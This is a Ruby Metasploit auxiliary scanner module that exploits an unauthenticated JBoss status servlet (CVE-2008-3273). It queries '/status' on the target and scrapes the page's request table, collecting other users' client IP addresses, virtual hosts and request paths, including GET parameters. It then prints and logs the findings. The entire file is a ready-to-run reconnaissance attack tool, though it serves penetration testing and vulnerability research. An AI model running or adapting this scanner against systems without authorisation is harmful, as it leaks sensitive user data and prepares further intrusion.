##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'JBoss Status Servlet Information Gathering',
      'Description' => %q{
        This module queries the JBoss status servlet to collect sensitive
        information, including URL paths, GET parameters and client IP addresses.
        This module has been tested against JBoss 4.0, 4.2.2 and 4.2.3.
      },
      'References'  =>
        [
          ['CVE', '2008-3273'],
          ['URL', 'https://seclists.org/fulldisclosure/2011/Sep/139'],
          ['URL', 'https://www.owasp.org/images/a/a9/OWASP3011_Luca.pdf'],
          ['URL', 'http://www.slideshare.net/chrisgates/lares-fromlowtopwned']
        ],
      'Author'      => 'Matteo Cantoni <goony[at]nothink.org>',
      'License'     => MSF_LICENSE
    )

    register_options([
      Opt::RPORT(8080),
      OptString.new('TARGETURI', [ true,  'The JBoss status servlet URI path', '/status'])
    ])
  end

  def run_host(target_host)
    jpath = normalize_uri(target_uri.to_s)

    @requests  = []

    vprint_status("#{rhost}:#{rport} - Collecting data through #{jpath}...")

    res = send_request_raw({
      'uri'    => jpath,
      'method' => 'GET'
    })

    # detect JBoss application server
    if res and res.code == 200 and res.body.match(/<title>Tomcat Status<\/title>/)
      http_fingerprint({:response => res})

      html_rows = res.body.split(/<strong>/)
      html_rows.each do |row|

        #Stage      Time    B Sent  B Recv  Client  VHost   Request
        #K  150463510 ms    ?       ?       1.2.3.4 ?       ?

        # filter client requests
        if row.match(/(.*)<\/strong><\/td><td>(.*)<\/td><td>(.*)<\/td><td>(.*)<\/td><td>(.*)<\/td><td nowrap>(.*)<\/td><td nowrap>(.*)<\/td><\/tr>/)

          j_src  = $5
          j_dst  = $6
          j_path = $7

          @requests << [j_src, j_dst, j_path]
        end
      end
    elsif res and res.code == 401
      vprint_error("#{rhost}:#{rport} - Authentication is required")
      return
    elsif res and res.code == 403
      vprint_error("#{rhost}:#{rport} - Forbidden")
      return
    else
      vprint_error("#{rhost}:#{rport} - Unknown error")
      return
    end

    # show results
    unless @requests.empty?
      show_results(target_host)
    end
  end

  def show_results(target_host)
    print_good("#{rhost}:#{rport} JBoss application server found")

    req_table = Rex::Text::Table.new(
      'Header'  => 'JBoss application server requests',
        'Indent'  => 1,
        'Columns' => ['Client', 'Vhost target', 'Request']
    )

    @requests.each do |r|
      req_table << r
      report_note({
        :host  => target_host,
        :proto => 'tcp',
        :sname => (ssl ? 'https' : 'http'),
        :port  => rport,
        :type  => 'JBoss application server info',
        :data  => "#{rhost}:#{rport} #{r[2]}"
      })
    end

    print_line
    print_line(req_table.to_s)
  end
end
